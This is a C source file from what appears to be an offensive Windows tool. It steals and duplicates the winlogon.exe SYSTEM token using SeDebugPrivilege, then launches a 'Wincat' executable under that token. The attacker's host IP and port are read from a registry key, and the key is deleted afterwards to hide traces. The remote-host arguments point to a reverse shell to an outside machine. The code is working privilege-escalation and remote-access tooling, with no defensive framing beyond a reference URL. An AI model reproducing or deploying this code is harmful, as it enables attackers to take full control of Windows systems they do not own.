// https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html



#include <Windows.h>
#include <tchar.h>
#include <stdio.h>

#include "Tools.h"
#include "CheckSystem.h"

BOOL GetTargetHost(WCHAR** argurments, WCHAR* arg0) {
	const char* regKey = "Software\\Wincat";
	printf("[i] Get System\n");
	DWORD RHostIPaddressSize = 128;
	DWORD RHostPortSize = 10;
	DWORD argurmentsSize = RHostIPaddressSize + RHostPortSize + 1 + wcslen(arg0);
	*argurments = (WCHAR*)calloc(argurmentsSize, sizeof(WCHAR));
	if (*argurments == NULL)
		return FALSE;
	char* RHostIPaddress = (char*)calloc(RHostIPaddressSize, 1);
	if (RHostIPaddress != NULL) {
		char* RHostPort = (char*)calloc(RHostPortSize, 1);
		if (RHostPort != NULL) {
			if (ReadRegistryValue(HKEY_CURRENT_USER, regKey, "RHostIP", RHostIPaddress, RHostIPaddressSize)) {
				if (ReadRegistryValue(HKEY_CURRENT_USER, regKey, "RHostPORT", RHostPort, RHostPortSize)) {
					swprintf_s(*argurments, argurmentsSize, L"%s %hs %hs", arg0, RHostIPaddress, RHostPort);
					free(RHostPort);
					free(RHostIPaddress);
					return TRUE;
				}
			}
			free(RHostPort);
		}
		free(RHostIPaddress);
	}
	free(*argurments);
	return FALSE;
}


int GetSystem() {
	WCHAR *TargetProcess = L"winlogon.exe";
	WCHAR *ProcessToRun = L"C:\\ProgramData\\WinTools\\Wincat.exe";
	DWORD pid = GetTargetProcessPID(TargetProcess);

	if (pid == 0) {
		printf("Fail to find process %ws !\n", TargetProcess);
		return FALSE;
	}
	if (!EnableWindowsPrivilege(SE_DEBUG_NAME)) {
		printf("Could not enable SeDebugPrivilege!\n");
		return FALSE;
	}
	if (!CheckWindowsPrivilege(SE_DEBUG_NAME)) {
		printf("I do not have SeDebugPrivilege!\n");
		return FALSE;
	}
	printf("[+] SeDebugPrivilege set !\n");
	printf("[+] Pid Chosen: %d\n", pid);

	// Retrieves the remote process token.
	HANDLE pToken = GetAccessToken(pid);

	//These are required to call DuplicateTokenEx.
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken;
	if (!DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, 0, seImpersonateLevel, tokenType, &pNewToken)) {
		DWORD LastError = GetLastError();
		printf("ERROR: Could not duplicate process token [%d]\n", LastError);
		return TRUE;
	}
	printf("[+] Process token has been duplicated.\n");

	/* Starts a new process with SYSTEM token */
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	WCHAR* argurments;
	if (GetTargetHost(&argurments, ProcessToRun)) {
		printf("Args: %ws\n", argurments);
		DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
		if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, ProcessToRun, argurments, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			DWORD lastError = GetLastError();
			printf("CreateProcessWithTokenW: %d\n", lastError);
			free(argurments);
			return TRUE;
		}
		free(argurments);
	}
	DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software", "Wincat");
	printf("[i] Process created !\n");
	system("pause");
	return FALSE;
}
